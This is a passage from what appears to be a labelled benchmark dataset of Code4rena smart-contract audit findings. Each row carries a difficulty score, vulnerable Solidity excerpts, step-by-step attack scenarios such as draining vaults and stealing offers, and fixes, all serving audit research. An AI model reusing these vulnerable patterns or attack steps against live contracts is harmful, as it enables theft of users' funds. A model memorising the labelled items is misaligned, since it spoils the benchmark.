from other pools. This inevitably leads to certain loss of rewards for users who have deposited LP tokens into these victim pools. Ascrvandcvxare reward tokens by default, it is very likely that someone will want to exploit this issue.\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": [\n      \"The warden has identified how through a combination of using the shelter and sending funds back, the funds would actually end up being stuck and non-withdrawable by depositors.\",\n      \"I believe that generally speaking this would be a Medium Severity finding as the funds would be stuck if the sponsor were to activate the shelter and then send the tokens back (conditionality).\",\n      \"However, the warden has shown that the system of Contract + Shelter is effectively broken, and for this reason I believe the finding is of High Severity.\"\n    ],\n    \"proof_of_concept\": [\n      \"Let‚Äôs consider the following scenario:\",\n      \"There are two convex pools with _pid 0 and 1.\",\n      \"Both pools currently only distribute cvx tokens.\",\n      \"Alice deposits LP tokens into the pool with _pid 0.\",\n      \"Both pools earn 100 cvx tokens which are to be distributed to the holders of the two pools.\",\n      \"While Alice is a sole staker of the pool with _pid 0, the pool with _pid 1 has several stakers.\",\n      \"Alice decides she wants to maximise her potential rewards, so she directly calls the unguarded IRewardStaking(convexPool[_pid]).getReward function on both pools, resulting in 200 cvx tokens being sent to the contract.\",\n      \"She then decides to deposit the 0 amount to execute the _calcRewardIntegral function on the pool with _pid 0. However, this function will calculate d_reward as bal - reward.remaining which is effectively the change in contract balance. As we have directly claimed cvx tokens over the two pools, this d_reward will be equal to 200.\",\n      \"Alice is then entitled to the entire 200 tokens as she is the sole staker of her pool. So instead of receiving 100 tokens, she is able to siphon rewards from other pools.\",\n      \"Altogether, this will lead to the loss of rewards for other stakers as they are unable to then claim their rewards.\",\n      \"ConvexStakingWrapper.sol#L216-L259\",\n      \"function _calcRewardIntegral(\\nuint256 _pid,\\nuint256 _index,\\naddress _account,\\nuint256 _balance,\\nuint256 _supply\\n) internal {\\nRewardType memory reward = rewards[_pid][_index];\\n//get difference in balance and remaining rewards\\n//getReward is unguarded so we use remaining to keep track of how much was actually claimed\\nuint256 bal = IERC20(reward.token).balanceOf(address(this));\\nuint256 d_reward = bal - reward.remaining;\\n// send 20 % of cvx / crv reward to treasury\\nif (reward.token == cvx || reward.token == crv) {\\nIERC20(reward.token).transfer(treasury, d_reward / 5);\\nd_reward = (d_reward * 4) / 5;\\n}\\nIERC20(reward.token).transfer(address(claimContract), d_reward);\\nif (_supply > 0 && d_reward > 0) {\\nreward.integral =\\nreward.integral +\\nuint128((d_reward * 1e20) / _supply);\\n}\\n//update user integrals\\nuint256 userI = userReward[_pid][_index][_account].integral;\\nif (userI < reward.integral) {\\nuserReward[_pid][_index][_account].integral = reward.integral;\\nclaimContract.pushReward(\\n\\n_account,\\nreward.token,\\n(_balance * (reward.integral - userI)) / 1e20\\n);\\n}\\n//update remaining reward here since balance could have changed if claiming\\nif (bal != reward.remaining) {\\nreward.remaining = uint128(bal);\\n}\\nrewards[_pid][_index] = reward;\\n}\"\n    ],\n    \"recommended_mitigation\": [\n      \"Consider redesigning this mechanism such that all pools have their getReward function called in _checkpoint. The _calcRewardIntegral function can then ensure that each pool is allocated only a fraction of the total rewards instead of the change in contract balance. Other implementations might be more ideal, so it is important that careful consideration is taken when making these changes.\"\n    ]\n  },\n  {\n    \"row_number\": 165,\n    \"bug_id\": \" H-01\",\n    \"bug_label\": \" S4-1\",\n    \"difficulty\": 5,\n    \"bug_description\": \" \\\"IndexLogic: An attacker can mint tokens for himself using assets deposited by other users\\\"\",\n    \"line\": \"IndexLogic[48]\",\n    \"url\": \" https://code4rena.com/reports/2022-04-phuture#h-01-indexlogic-an-attacker-can-mint-tokens-for-himself-using-assets-deposited-by-other-users\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by cccz, also found by hyh, Kenshin, pedroais, and TrungOre\",\n      \"In the mint function of the IndexLogic contract, users are required to transfer assets to vToken in advance, and then call the mint function to mint tokens.\\nThe attacker can monitor the asset balance in the vToken contract. When the balance is greater than lastBalance, the attacker can call the mint function to mint tokens for himself.\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": null,\n    \"proof_of_concept\": [\"IndexLogic.sol#L48\"],\n    \"recommended_mitigation\": [\n      \"Call the transferfrom function in the mint function of the IndexLogic contract to transfer the user‚Äôs assets.\",\n      \"olivermehr (Phuture Finance) disputed\",\n      \"jn-lp (Phuture Finance) commented:\",\n      \"We don‚Äôt expect users to directly call the Mint/Burn functions on Index. Instead, they should use the Router contract, as our frontend does.\",\n      \"moose-code (judge) commented:\",\n      \"There is no mention of the router contract in the contest documentation and this is unreasonable for wardens to know about the Router.\",\n      \"We would like wardens to focus on any core functional logic, boundary case errors or similar issues which could be utilized by an attacker to take funds away from clients who have funds deposited in the protocol.\",\n      \"This a core logic error that could be used to take funds away from clients and given there is no mention of the router and only part of the code is submitted, I am siding with the wardens on this and awarding in full.\",\n      \"\"\n    ]\n  },\n  {\n    \"row_number\": 166,\n    \"bug_id\": \" H-01\",\n    \"bug_label\": \" S6-3\",\n    \"difficulty\": 5,\n    \"bug_description\": \" \\\"ERC4626 mint uses wrong amount\\\"\",\n    \"line\": \"\",\n    \"url\": \" https://code4rena.com/reports/2022-02-tribe-turbo#h-01-erc4626-mint-uses-wrong-amount\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by cmichel, also found by 0xliumin, CertoraInc, Picodes, and Ruhum\",\n      \"TheERC4626.mintfunction mintsamountinstead ofshares.\\nThis will lead to issues when theasset <> sharesare not 1-to-1 as will be the case for most vaults over time.\\nUsually, the asset amount is larger than the share amount as vaults receive asset yield.\\nTherefore, when minting,sharesshould be less thanamount.\\nUsers receive a larger share amount here which can be exploited to drain the vault assets.\"\n    ],\n    \"code_blocks\": [\n      \"function\\nmint\\n(\\nuint256\\nshares\\n,\\naddress\\nto\\n)\\npublic\\nvirtual\\nreturns\\n(\\nuint256\\namount\\n) {\\namount\\n=\\npreviewMint\\n(\\nshares\\n);\\n// No need to check for rounding error, previewMint rounds up.\\n// Need to transfer before minting or ERC777s could reenter.\\nasset\\n.\\nsafeTransferFrom\\n(\\nmsg\\n.\\nsender\\n,\\naddress\\n(\\nthis\\n),\\namount\\n);\\n_mint\\n(\\nto\\n,\\namount\\n);\\nemit\\nDeposit\\n(\\nmsg\\n.\\nsender\\n,\\nto\\n,\\namount\\n,\\nshares\\n);\\nafterDeposit\\n(\\namount\\n,\\nshares\\n);\\n}\"\n    ],\n    \"quotes\": [\n      \"The docs/video sayERC4626.solis in scope as its part ofTurboSafe\"\n    ],\n    \"proof_of_concept\": [\n      \"Assumevault.totalSupply() = 1000,totalAssets = 1500\",\n      \"callmint(shares=1000). Only need to pay1000asset amount but receive1000shares =>vault.totalSupply() = 2000,totalAssets = 2500.callredeem(shares=1000). Receive(1000 / 2000) * 2500 = 1250amounts. Make a profit of250asset tokens.repeat untilshares <> assetsare 1-to-1\"\n    ],\n    \"recommended_mitigation\": [\n      \"Indeposit:\",\n      \"function mint(uint256 shares, address to) public virtual returns (uint256 amount) {\\n-    _mint(to, amount);\\n+    _mint(to, shares);\\n}\",\n      \"Alex the Entreprenerd (judge):\",\n      \"The warden has identified what is most likely a small oversight, which would have drastic consequences in the internal accounting of the Vault.\\nBecause of impact, I agree with high severity.The sponsor has mitigated.\",\n      \"\"\n    ]\n  },\n  {\n    \"row_number\": 167,\n    \"bug_id\": \" H-01\",\n    \"bug_label\": \" S2-2\",\n    \"difficulty\": 2,\n    \"bug_description\": \" \\\"NFT owner can create multiple auctions\\\"\",\n    \"line\": \"NFTMarketReserveAuction[325,596]\",\n    \"url\": \" https://code4rena.com/reports/2022-02-foundation#h-01-nft-owner-can-create-multiple-auctions\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by 0xliumin, also found by leastwood\",\n      \"NFTMarketReserveAuction.sol#L325-L349NFTMarketReserveAuction.sol#L596-L599\",\n      \"NFT owner can permanently lock funds of bidders.\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": null,\n    \"proof_of_concept\": [\n      \"Alice (the attacker) callscreateReserveAuction, and creates one like normal. let this be auction id 1.\",\n      \"Alice callscreateReserveAuctionagain, before any user has placed a bid (this is easy to guarantee with a deployed attacker contract). We‚Äôd expect that Alice wouldn‚Äôt be able to create another auction, but she can, because_transferToEscrowdoesn‚Äôt revert if there‚Äôs an existing auction. let this be Auction id 2.\",\n      \"SincenftContractToTokenIdToAuctionId[nftContract][tokenId]will contain auction id 2, all bidders will see that auction as the one to bid on (unless they inspect contract events or data manually).\",\n      \"Alice can now cancel auction id 1, then cancel auction id 2, locking up the funds of the last bidder on auction id 2 forever.\"\n    ],\n    \"recommended_mitigation\": [\n      \"Prevent NFT owners from creating multiple auctions.\",\n      \"NickCuso (Foundation) confirmed and commented:\",\n      \"This is a great find!The impact of this bug is:Bidder‚Äôs funds are stuck in escrow in an unrecoverable way without an upgrade, and even with an upgrade it would have been non-trivial to offer a migration path to recover the funds (but it would have been possible to recover correctly).It allows sellers to stop the clock and/or back out of an auction. Normally once a bid is received we do not allow the seller to cancel the auction. With this bug, they could have created a new auction and then cancel that in order to back out of the deal entirely. This violates trust with collectors.We have fixed this problem by adding the following code tocreateReserveAuction:// This check must be after _transferToEscrow in case auto-settle was requiredif(nftContractToTokenIdToAuctionId[nftContract][tokenId] !=0) {revertNFTMarketReserveAuction_Already_Listed(nftContractToTokenIdToAuctionId[nftContract][tokenId]);}\",\n      \"\"\n    ]\n  },\n  {\n    \"row_number\": 168,\n    \"bug_id\": \" H-03\",\n    \"bug_label\": \" S4-1\",\n    \"difficulty\": 4,\n    \"bug_description\": \" \\\"An offer made after auction end can be stolen by an auction winner\\\"\",\n    \"line\": \"NFTMarketOffer[200,262,296],NFTMarketReserveAuction[556,666],NFTMarketBuyPrice[283]\",\n    \"url\": \" https://code4rena.com/reports/2022-02-foundation#h-03-an-offer-made-after-auction-end-can-be-stolen-by-an-auction-winner\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by hyh, also found by leastwood, shenwilly, and WatchPug\",\n      \"An Offer which is made for an NFT when auction has ended, but its winner hasn‚Äôt received the NFT yet, can be stolen by this winner as_transferFromEscrowbeing called by_acceptOfferwill transfer the NFT to the winner, finalising the auction, while no transfer to the user who made the offer will happen.\",\n      \"This way the auction winner will obtain both the NFT and the offer amount after the fees at no additional cost, at the expense of the user who made the offer.\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": [\n      \"es! This was a great find and a major issue with our implementation. I‚Äôm very happy that it was flagged by a few different people, it helps raise our confidence that several wardens really dove into the code.\",\n      \"It was a big miss on our part that this was not thoroughly tested. Our tests for this scenario confirmed the events and payouts, but did not validate the ownership in the end!\",\n      \"The proposed fix is perfect and exactly what we have implemented. This follows the patterns we established well, and actually simplifies the logic here so that things are easier to reason about.\"\n    ],\n    \"proof_of_concept\": [\n      \"When an auction has ended, there is a possibility to make the offers for an auctioned NFT as:\",\n      \"makeOffer checks _isInActiveAuction:\",\n      \"https://github.com/code-423n4/2022-02-foundation/blob/main/contracts/mixins/NFTMarketOffer.sol#L200\",\n      \"_isInActiveAuction returns false when auctionIdToAuction[auctionId].endTime < block.timestamp, so makeOffer above can proceed:\",\n      \"https://github.com/code-423n4/2022-02-foundation/blob/main/contracts/mixins/NFTMarketReserveAuction.sol#L666-L669\",\n      \"Then, the auction winner can call acceptOffer -> _acceptOffer (or setBuyPrice -> _autoAcceptOffer -> _acceptOffer).\",\n      \"_acceptOffer will try to transfer directly, and then calls _transferFromEscrow:\",\n      \"https://github.com/code-423n4/2022-02-foundation/blob/main/contracts/mixins/NFTMarketOffer.sol#L262-L271\",\n      \"If the auction has ended, but a winner hasn‚Äôt picked up the NFT yet, the direct transfer will fail, proceeding with _transferFromEscrow in the FNDNFTMarket defined order:\",\n      \"function _transferFromEscrow(\\naddress nftContract,\\nuint256 tokenId,\\naddress recipient,\\naddress seller\\n) internal override(NFTMarketCore, NFTMarketReserveAuction, NFTMarketBuyPrice, NFTMarketOffer) {\\nsuper._transferFromEscrow(nftContract, tokenId, recipient, seller);\\n} \",\n      \"NFTMarketOffer._transferFromEscrow will call super as nftContractToIdToOffer was already deleted:\",\n      \"https://github.com/code-423n4/2022-02-foundation/blob/main/contracts/mixins/NFTMarketOffer.sol#L296-L302\",\n      \"NFTMarketBuyPrice._transferFromEscrow will call super as there is no buy price set:\",\n      \"https://github.com/code-423n4/2022-02-foundation/blob/main/contracts/mixins/NFTMarketBuyPrice.sol#L283-L293\",\n      \"Finally, NFTMarketReserveAuction._transferFromEscrow will send the NFT to the winner via _finalizeReserveAuction, not to the user who made the offer:\",\n      \"https://github.com/code-423n4/2022-02-foundation/blob/main/contracts/mixins/NFTMarketReserveAuction.sol#L556-L560\",\n      \"The recipient user who made the offer is not present in this logic, the NFT is being transferred to the auction.bidder, and the original acceptOffer will go through successfully.\"\n    ],\n    \"recommended_mitigation\": [\n      \"An attempt to set a buy price from auction winner will lead to auction finalisation, so _buy cannot be called with a not yet finalised auction, this way the NFTMarketReserveAuction._transferFromEscrow L550-L560 logic is called from the NFTMarketOffer._acceptOffer only:\",\n      \"https://github.com/code-423n4/2022-02-foundation/blob/main/contracts/mixins/NFTMarketOffer.sol#L270\",\n      \"is the only user of\",\n      \"https://github.com/code-423n4/2022-02-foundation/blob/main/contracts/mixins/NFTMarketReserveAuction.sol#L550-L560\",\n      \"This way the fix is to update L556-L560 for the described case as:\",\n      \"Now:\",\n      \"// Finalization will revert if the auction has not yet ended.\\n_finalizeReserveAuction(auctionId, false);\\n// Finalize includes the transfer, so we are done here.\\nreturn;\",\n      \"To be, we leave the NFT in the escrow and let L564 super call to transfer it to the recipient:\",\n      \"// Finalization will revert if the auction has not yet ended.\\nfinalizeReserveAuction(auctionId, true);\"\n    ]\n  },\n  {\n    \"row_number\": 169,\n    \"bug_id\": \" H-03\",\n    \"bug_label\": \" S6-4\",\n    \"difficulty\": 4,\n    \"bug_description\": \" \\\"Wrong formula when add fee incentivePool can lead to loss of funds.\\\"\",\n    \"line\": \"LiquidityPool[319]\",\n    \"url\": \" https://code4rena.com/reports/2022-03-biconomy#h-03-wrong-formula-when-add-fee-incentivepool-can-lead-to-loss-of-funds\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by minhquanym, also found by cmichel, hickuphh3, and WatchPug\",\n      \"LiquidityPool.sol#L319-L322\",\n      \"ThegetAmountToTransferfunction ofLiquidityPoolupdatesincentivePool[tokenAddress]by adding some fee to it but the formula is wrong and the value ofincentivePool[tokenAddress]will be divided byBASE_DIVISOR(10000000000) each time.\\nAfter just a few time, the value ofincentivePool[tokenAddress]will become zero and that amount oftokenAddresstoken will be locked in contract.\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": null,\n    \"proof_of_concept\": [\n      \"Line 319-322\",\n      \"incentivePool[tokenAddress] = (incentivePool[tokenAddress] + (amount * (transferFeePerc - tokenManager.getTokensInfo(tokenAddress).equilibriumFee))) / BASE_DIVISOR;\",\n      \"Letx = incentivePool[tokenAddress],y = amount,z = transferFeePercandt = tokenManager.getTokensInfo(tokenAddress).equilibriumFee. Then that be written as\",\n      \"x = (x + (y * (z - t))) / BASE_DIVISOR;\\nx = x / BASE_DIVISOR + (y * (z - t)) / BASE_DIVISOR;\"\n    ],\n    \"recommended_mitigation\": [\n      \"Fix the bug by changing lines 319-322 to:\",\n      \"incentivePool[tokenAddress] += (amount * (transferFeePerc - tokenManager.getTokensInfo(tokenAddress).equilibriumFee)) / BASE_DIVISOR;\",\n      \"ankurdubey521 (Biconomy) confirmed\",\n      \"pauliax (judge) commented:\",\n      \"Great find, the wrong order of arithmetic operations deserves a severity of high as it would have serious negative consequences.\",\n      \"\"\n    ]\n  },\n  {\n    \"row_number\": 170,\n    \"bug_id\": \" H-01\",\n    \"bug_label\": \" S6-2\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"LenderPool: Principal withdrawable is incorrectly calculated if start() is invoked with non-zero start fee\\\"\",\n    \"line\": \"LenderPool[399,594]\",\n    \"url\": \" https://code4rena.com/reports/2022-03-sublime#h-01-lenderpool-principal-withdrawable-is-incorrectly-calculated-if-start-is-invoked-with-non-zero-start-fee\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by hickuphh3\",\n      \"LenderPool.sol#L594-L599LenderPool.sol#L399-L404\",\n      \"The_principalWithdrawablecalculated will be more than expected if_start()is invoked with a non-zero start fee, because the borrow limit is reduced by the fee, resulting intotalSupply[id]not being 1:1 with the borrow limit.\"\n    ],\n    \"code_blocks\": [\n      \"function\\n_calculatePrincipalWithdrawable\\n(\\nuint256\\n_id\\n,\\naddress\\n_lender\\n)\\ninternal\\nview\\nreturns\\n(\\nuint256\\n) {\\nuint256\\n_borrowedTokens\\n=\\npooledCLConstants\\n[\\n_id\\n].\\nborrowLimit\\n;\\nuint256\\n_totalLiquidityWithdrawable\\n=\\n_borrowedTokens\\n.\\nsub\\n(\\nPOOLED_CREDIT_LINE\\n.\\ngetPrincipal\\n(\\n_id\\n));\\nuint256\\n_principalWithdrawable\\n=\\n_totalLiquidityWithdrawable\\n.\\nmul\\n(\\nbalanceOf\\n(\\n_lender\\n,\\n_id\\n)).\\ndiv\\n(\\n_borrowedTokens\\n);\\nreturn\\n_principalWithdrawable\\n;\\n}\"\n    ],\n    \"quotes\": null,\n    \"proof_of_concept\": [\n      \"Assume the following conditions:\",\n      \"Alice, the sole lender, provided100_000tokens:totalSupply[_id] = 100_000borrowLimit = 99_000because of a 1% startFeeBorrower borrowed zero amount\",\n      \"When Alice attempts to withdraw her tokens, the_principalWithdrawableamount is calculated as\",\n      \"_borrowedTokens\\n=\\n99_000\\n_totalLiquidityWithdrawable\\n=\\n99_000\\n-\\n0\\n=\\n99_000\\n_principalWithdrawable\\n=\\n99_000\\n*\\n100_000\\n/\\n99_000\\n=\\n100_000\",\n      \"This is more than the available principal amount of99_000, so the withdrawal will fail.\"\n    ],\n    \"recommended_mitigation\": [\n      \"One hack-ish way is to save the initial supply inminBorrowAmount(perhaps rename the variable tominInitialSupply) when the credit line is accepted, and replacetotalSupply[_id]with it.\",\n      \"The other places whereminBorrowAmountare used will not be affected by the change because:\",\n      \"startTime has been zeroed, sostart()cannot be invoked (revert with error S1)credit line status would have been changed toACTIVEand cannot be changed back toREQUESTED, meaning the check below will be false regardless of the value ofminBorrowAmount._status==PooledCreditLineStatus.REQUESTED&&block.timestamp>pooledCLConstants[_id].startTime&&totalSupply[_id] <pooledCLConstants[_id].minBorrowAmount\",\n      \"Code amendment example:\",\n      \"function\\n_accept\\n(\\nuint256\\n_id\\n,\\nuint256\\n_amount\\n)\\ninternal\\n{\\n...\\n// replace delete pooledCLConstants[_id].minBorrowAmount; with the following:\\npooledCLConstants\\n[\\n_id\\n].\\nminInitialSupply\\n=\\ntotalSupply\\n[\\n_id\\n];\\n}\\n// update comment in _withdrawLiquidity\\n// Case 1: Pooled credit line never started because desired amount wasn't reached\\n// state will never revert back to REQUESTED if credit line is accepted so this case is never run\\nfunction\\n_calculatePrincipalWithdrawable\\n(\\nuint256\\n_id\\n,\\naddress\\n_lender\\n)\\ninternal\\nview\\nreturns\\n(\\nuint256\\n) {\\nuint256\\n_borrowedTokens\\n=\\npooledCLConstants\\n[\\n_id\\n].\\nborrowLimit\\n;\\nuint256\\n_totalLiquidityWithdrawable\\n=\\n_borrowedTokens\\n.\\nsub\\n(\\nPOOLED_CREDIT_LINE\\n.\\ngetPrincipal\\n(\\n_id\\n));\\n// totalSupply[id] replaced with minInitialSupply\\nuint256\\n_principalWithdrawable\\n=\\n_totalLiquidityWithdrawable\\n.\\nmul\\n(\\nbalanceOf\\n(\\n_lender\\n,\\n_id\\n)).\\ndiv\\n(\\nminInitialSupply\\n);\\nreturn\\n_principalWithdrawable\\n;\\n}\",\n      \"Interminate(), the shares withdrawable can simply be_sharesHeld.\",\n      \"function\\nterminate\\n(\\nuint256\\n_id\\n,\\naddress\\n_to\\n)\\nexternal\\noverride\\nonlyPooledCreditLine\\nnonReentrant\\n{\\naddress\\n_strategy\\n=\\npooledCLConstants\\n[\\n_id\\n].\\nborrowAssetStrategy\\n;\\naddress\\n_borrowAsset\\n=\\npooledCLConstants\\n[\\n_id\\n].\\nborrowAsset\\n;\\nuint256\\n_sharesHeld\\n=\\npooledCLVariables\\n[\\n_id\\n].\\nsharesHeld\\n;\\nSAVINGS_ACCOUNT\\n.\\nwithdrawShares\\n(\\n_borrowAsset\\n,\\n_strategy\\n,\\n_to\\n,\\n_sharesHeld\\n,\\nfalse\\n);\\ndelete\\npooledCLConstants\\n[\\n_id\\n];\\ndelete\\npooledCLVariables\\n[\\n_id\\n];\\n}\",\n      \"ritik99 (Sublime) confirmed\",\n      \"\"\n    ]\n  },\n  {\n    \"row_number\": 171,\n    \"bug_id\": \" H-02\",\n    \"bug_label\": \" S6-3\",\n    \"difficulty\": 3,\n    \"bug_description\": \" \\\"PooledCreditLine: termination likely fails because _principleWithdrawable is treated as shares\\\"\",\n    \"line\": \"LenderPool[404]\",\n    \"url\": \" https://code4rena.com/reports/2022-03-sublime#h-02-pooledcreditline-termination-likely-fails-because-_principlewithdrawable-is-treated-as-shares\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by hickuphh3, also found by rayn and WatchPug\",\n      \"LenderPool.sol#L404-L406\",\n      \"_principalWithdrawableis denominated in the borrowAsset, but subsequently treats it as the share amount to be withdrawn.\"\n    ],\n    \"code_blocks\": [\n      \"// _notBorrowed = borrowAsset amount that isn't borrowed\\n// totalSupply[_id] = ERC1155 total supply of _id\\n// _borrowedTokens = borrower's specified borrowLimit\\nuint256\\n_principalWithdrawable\\n=\\n_notBorrowed\\n.\\nmul\\n(\\ntotalSupply\\n[\\n_id\\n]).\\ndiv\\n(\\n_borrowedTokens\\n);\\nSAVINGS_ACCOUNT\\n.\\nwithdrawShares\\n(\\n_borrowAsset\\n,\\n_strategy\\n,\\n_to\\n,\\n_principalWithdrawable\\n.\\nadd\\n(\\n_totalInterestInShares\\n),\\nfalse\\n);\"\n    ],\n    \"quotes\": null,\n    \"proof_of_concept\": null,\n    \"recommended_mitigation\": [\n      \"The amount of shares to withdraw can simply be _sharesHeld.\",\n      \"Note that this comes with the assumption that terminate() is only called when the credit line is ACTIVE or EXPIRED (consider ensuring this condition on-chain), because _sharesHeld excludes principal withdrawals, so the function will fail once a lender withdraws his principal.\",\n      \"function terminate(uint256 _id, address _to) external override onlyPooledCreditLine nonReentrant {\\naddress _strategy = pooledCLConstants[_id].borrowAssetStrategy;\\naddress _borrowAsset = pooledCLConstants[_id].borrowAsset;\\nuint256 _sharesHeld = pooledCLVariables[_id].sharesHeld;\\nSAVINGS_ACCOUNT.withdrawShares(_borrowAsset, _strategy, _to, _sharesHeld, false);\\ndelete pooledCLConstants[_id];\\ndelete pooledCLVariables[_id];\\n}\"\n    ]\n  },\n  {\n    \"row_number\": 172,\n    \"bug_id\": \" H-01\",\n    \"bug_label\": \" S6-1\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"Oracle price does not compound\\\"\",\n    \"line\": \"ScalingPriceOracle[113,136]\",\n    \"url\": \" https://code4rena.com/reports/2022-03-volt#h-01-oracle-price-does-not-compound\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by cmichel\",\n      \"ScalingPriceOracle.sol#L136ScalingPriceOracle.sol#L113\",\n      \"The oracle does not correctly compound the monthly APRs - it resets onfulfill.Note that theoraclePricestorage variableis only set in_updateCPIDataas part of the oraclefulfillcallback.It‚Äôs set to the old price (price from 1 month ago) plus the interpolation fromstartTimeto now.However,startTimeisresetinrequestCPIDatadue to theafterTimeInitmodifier, and therefore when Chainlink callsfulfillin response to the CPI request, thetimeDelta = block.timestamp - startTimeis close to zero again andoraclePriceis updated to itself again.\",\n      \"This breaks the core functionality of the protocol as the oracle does not track the CPI, it always resets to1.0after everyfulfillinstead of compounding it.In addition, there should also be a way for an attacker to profit from the sudden drop of the oracle price to1.0again.\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": null,\n    \"proof_of_concept\": [\n      \"As an example, assume oraclePrice = 1.0 (1e18), monthlyAPR = 10%. The time elapsed is 14 days. Calling getCurrentOraclePrice() now would return 1.0 + 14/28 * 10% = 1.05.\",\n      \"It‚Äôs now the 15th of the month and one can trigger requestCPIData. This resets startTime = now.\",\n      \"Calling getCurrentOraclePrice() now would return 1.0 again as timeDelta (and priceDelta) is zero: oraclePriceInt + priceDelta = oraclePriceInt = 1.0.\",\n      \"When fulfill is called it sets oraclePrice = getCurrentOraclePrice() which will be close to 1.0 as the timeDelta is tiny.\"\n    ],\n    \"recommended_mitigation\": [\n      \"The oraclePrice should be updated in requestCPIData() not in fulfill.\",\n      \"Cover this scenario of multi-month accumulation in tests.\"\n    ]\n  },\n  {\n    \"row_number\": 173,\n    \"bug_id\": \" H-01\",\n    \"bug_label\": \" S2-1\",\n    \"difficulty\": 5,\n    \"bug_description\": \" \\\"Reliance on lifiData.receivingAssetId can cause loss of funds\\\"\",\n    \"line\": \"GenericSwapFacet[23]\",\n    \"url\": \" https://code4rena.com/reports/2022-03-lifinance#h-01-reliance-on-lifidatareceivingassetid-can-cause-loss-of-funds\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by 0xDjango, also found by hake, kirk-baird, rayn, and shenwilly\",\n      \"GenericSwapFacet.sol#L23-L30\",\n      \"In theswapTokensGeneric()function, an arbitrary number of swaps can be performed from and to various tokens. However, the final balance that is sent to the user relies on_lifiData.receivingAssetIdwhich has no use in the swapping functionality. LifiData is claimed to be used purely for analytical reasons per the comments to this function. If this value is input incorrectly, the swapped tokens will simply sit in the contract and be lost to the user.\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": null,\n    \"proof_of_concept\": [\n      \"Imagine a call toswapTokensGeneric()with the following parameters (excluding unnecessary parameters for this example):\",\n      \"LifiData.receivingAssetId = ‚Äò0xUSDC_ADDRESS‚Äô\",\n      \"Single SwapData array:\",\n      \"LibSwap.SwapData.sendingAssetId = ‚Äò0xWETH_ADDRESS‚ÄôLibSwap.SwapData.receivingAssetId = ‚Äò0xDAI_ADDRESS‚Äô\",\n      \"Since thereceivingAssetIdfromSwapDatadoes not match thereceivingAssetIdfromLifiData, the final funds will not be sent to the user after the swap is complete, based on the following lines of code:\",\n      \"uint256 receivingAssetIdBalance = LibAsset.getOwnBalance(_lifiData.receivingAssetId);\\n_executeSwaps(_lifiData, _swapData);\\nuint256 postSwapBalance = LibAsset.getOwnBalance(_lifiData.receivingAssetId) - receivingAssetIdBalance;\\nLibAsset.transferAsset(_lifiData.receivingAssetId, payable(msg.sender), postSwapBalance);\",\n      \"Lines 1, 3, and 4 referenceLifiData.receivingAssetIdand handle the transfer of funds following the swaps. Line 2 performs the swap, referencingSwapData.receivingAssetIdas can be seen in theexecuteSwaps()function definition:\",\n      \"function _executeSwaps(LiFiData memory _lifiData, LibSwap.SwapData[] calldata _swapData) internal {\\n// Swap\\nfor (uint8 i; i < _swapData.length; i++) {\\nrequire(\\nls.dexWhitelist[_swapData[i].approveTo] == true && ls.dexWhitelist[_swapData[i].callTo] == true,\\n\\\"Contract call not allowed!\\\"\\n);\\nLibSwap.swap(_lifiData.transactionId, _swapData[i]);\\n}\\n}\"\n    ],\n    \"recommended_mitigation\": [\n      \"I recommend adding a check that_lifiData.receivingAssetIdequals thereceivingAssetIdof the last index of the SwapData array, or simply use thereceivingAssetIdof the last index of the SwapData array for sending the final tokens to the user.\",\n      \"H3xept (Li.Fi) commented:\",\n      \"Fixed in lifinance/lifi-contracts@52aa2b8ea3bc51de3e60784c00201e29103fe250\",\n      \"gzeon (judge) commented:\",\n      \"Sponsor confirmed with fix.\",\n      \"\"\n    ]\n  },\n  {\n    \"row_number\": 174,\n    \"bug_id\": \" H-02\",\n    \"bug_label\": \" S5-3\",\n    \"difficulty\": 10,\n    \"bug_description\": \" \\\"Splitter: Anyone can call incrementWindow to steal the tokens in the contract\\\"\",\n    \"line\": \"Splitter[149]\",\n    \"url\": \" https://code4rena.com/reports/2022-03-joyn#h-02-splitter-anyone-can-call-incrementwindow-to-steal-the-tokens-in-the-contract\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by cccz, also found by hickuphh3, kirk-baird, leastwood, pedroais, rayn, Ruhum, saian, WatchPug, and wuwe1\",\n      \"In general, the Splitter contract‚Äôs incrementWindow function is only called when tokens are transfer to the contract, ensuring that the number of tokens stored in balanceForWindow is equal to the contract balance.\\nHowever, anyone can use a fake RoyaltyVault contract to call the incrementWindow function of the Splitter contract, so that the amount of tokens stored in balanceForWindow is greater than the contract balance, after which the verified user can call the claim or claimForAllWindows functions to steal the tokens in the contract.\"\n    ],\n    \"code_blocks\": [\n      \"function incrementWindow(uint256 royaltyAmount) public returns (bool) {\\nuint256 wethBalance;\\nrequire(\\nIRoyaltyVault(msg.sender).supportsInterface(IID_IROYALTY),\\n\\\"Royalty Vault not supported\\\"\\n);\\nrequire(\\nIRoyaltyVault(msg.sender).getSplitter() == address(this),\\n\\\"Unauthorised to increment window\\\"\\n);\\nwethBalance = IERC20(splitAsset).balanceOf(address(this));\\nrequire(wethBalance >= royaltyAmount, \\\"Insufficient funds\\\");\\nrequire(royaltyAmount > 0, \\\"No additional funds for window\\\");\\nbalanceForWindow.push(royaltyAmount);\\ncurrentWindow += 1;\\nemit WindowIncremented(currentWindow, royaltyAmount);\\nreturn true;\\n}\"\n    ],\n    \"quotes\": null,\n    \"proof_of_concept\": [\n      \"https://github.com/code-423n4/2022-03-joyn/blob/main/splits/contracts/Splitter.sol#L149-L169\"\n    ],\n    \"recommended_mitigation\": [\n      \"Add the onlyRoyaltyVault modifier to the incrementWindow function of the Splitter contract to ensure that only RoyaltyVault contracts with a specific address can call this function.\",\n      \"sofianeOuafir 